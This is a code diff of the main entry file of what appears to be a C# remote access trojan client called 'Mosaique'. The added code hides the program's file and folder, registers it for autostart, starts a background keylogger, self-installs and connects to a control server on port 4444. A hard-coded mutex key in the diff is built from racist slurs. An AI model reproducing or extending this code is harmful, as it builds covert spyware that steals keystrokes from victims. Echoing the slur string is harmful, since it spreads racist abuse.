@@ -12,7 +12,8 @@ namespace Client
     {
         public static ClientMosaic client;
         public static Boot bootController;
-        private static ApplicationContext _msgLoop; // keylogger
+        private static ApplicationContext _msgLoop; // keylogger*
+        private static bool _result;
 
         /// <summary>
         /// Point d'entrée principal de l'application.
@@ -20,43 +21,87 @@ namespace Client
         [STAThread]
         static void Main()
         {
-            bool result;
 
             bootController = new Boot();
 
-            StreamReader readerMutex = new StreamReader(System.Reflection.Assembly.GetExecutingAssembly().Location);// TODO virer
-            MutexController.mutexKey = Boot.getMutexKey(readerMutex);// TODO virer
-            result = MutexController.createMutex();// TODO virer
+            //StreamReader readerMutex = new StreamReader(System.Reflection.Assembly.GetExecutingAssembly().Location);// TODO virer
+            //MutexController.mutexKey = Boot.getMutexKey(readerMutex);// TODO virer           
 
-            ClientData.installPath = Path.Combine(AuthenticationController.DIRECTORY, ((!string.IsNullOrEmpty(AuthenticationController.SUBDIRECTORY)) ? AuthenticationController.SUBDIRECTORY + @"\" : "") + AuthenticationController.INSTALLNAME); //  	Directory ~~== %USERPROFILE%\Application Data(\Roaming)
+            MutexController.mutexKey = "bougnoulonegroidomongolitoesclavago";// TODO virer            
 
-            if (!result)
-            {
-                MessageBox.Show("Another instance of application is already running !");
-                return;
-            }
-
-            if (bootController.autoStart)
-            {
-                if (!Boot.AddToStartup())
-                        ClientData.AddToStartupFailed = true;
-            }
-
-            if (bootController.klEnabled)
-            {
-                new Thread(() =>
-                {
-                    _msgLoop = new ApplicationContext();
-                    Keylogger logger = new Keylogger(15000);
-                    Application.Run(_msgLoop);
-                }){ IsBackground = true }.Start();
-            }
 
             Application.EnableVisualStyles();
             Application.SetCompatibleTextRenderingDefault(false);
-            client = new ClientMosaic("127.0.0.1", 4444);
-            //client = new ClientMosaic(bootController.host, bootController.port);
-            client.connect();
+            if (RunMosaique())
+            {
+                client = new ClientMosaic("127.0.0.1", 4444);
+                //client = new ClientMosaic(bootController.host, bootController.port);
+                client.connect();
+            }
+        }
+
+        private static bool RunMosaique()
+        {
+            _result = MutexController.createMutex();// TODO virer
+
+            if (!_result) // TODO virer
+            {
+                MessageBox.Show("Another instance of application is already running !");
+                return false;
+            }
+
+            ClientData.installPath = Path.Combine(Boot.DIRECTORY, ((!string.IsNullOrEmpty(Boot.installSubDirectory)) ? Boot.installSubDirectory + @"\" : "") + Boot.installFileName); //  	Directory ~~== %USERPROFILE%\Application Data(\Roaming)
+
+            // If install == false OR already installed
+            if(!Boot.installStub || ClientData.currentPath == ClientData.installPath) 
+            {
+                if(Boot.installStub && Boot.hideFile) // INSTALL
+                {
+                    try
+                    {
+                        File.SetAttributes(ClientData.currentPath, FileAttributes.Hidden);
+                    }
+                    catch
+                    {
+                    }
+                }
+                if(Boot.installStub && Boot.hideSubDirectory && !string.IsNullOrEmpty(Boot.installSubDirectory)) // INSTALL
+                {
+                    try
+                    {
+                        DirectoryInfo di = new DirectoryInfo(Path.GetDirectoryName(ClientData.installPath));
+                        di.Attributes |= FileAttributes.Hidden;
+                    }
+                    catch
+                    {
+
+                    }
+                }
+
+                if (Boot.autoStartEnabled) // STARTUP
+                {
+                    if (!Boot.AddToStartup())
+                        ClientData.AddToStartupFailed = true;
+                }
+                if (Boot.keyloggerEnabled) // KEYLOGGER
+                {
+                    new Thread(() =>
+                    {
+                        _msgLoop = new ApplicationContext();
+                        Keylogger logger = new Keylogger(15000);
+                        Application.Run(_msgLoop);
+                    })
+                    { IsBackground = true }.Start();
+                }
+
+                return true;
+            }
+            else
+            {
+                MutexController.closeMutex();
+                ClientInstallerController.install();
+                return false;
+            }
         }
     }
 }
